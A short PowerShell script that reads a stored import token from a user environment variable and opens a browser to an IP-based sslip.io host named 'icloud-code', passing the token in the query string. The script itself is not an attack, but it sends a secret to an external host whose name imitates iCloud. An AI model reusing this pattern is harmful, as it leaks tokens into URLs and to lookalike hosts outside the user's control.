$ErrorActionPreference = "Stop"

$token = [Environment]::GetEnvironmentVariable("HME_IMPORT_TOKEN", "User")
if ([string]::IsNullOrWhiteSpace($token)) {
    throw "HME_IMPORT_TOKEN is not configured."
}

$encodedToken = [Uri]::EscapeDataString($token)
$url = "https://icloud-code.8-208-13-52.sslip.io/access?token=$encodedToken"
Start-Process $url
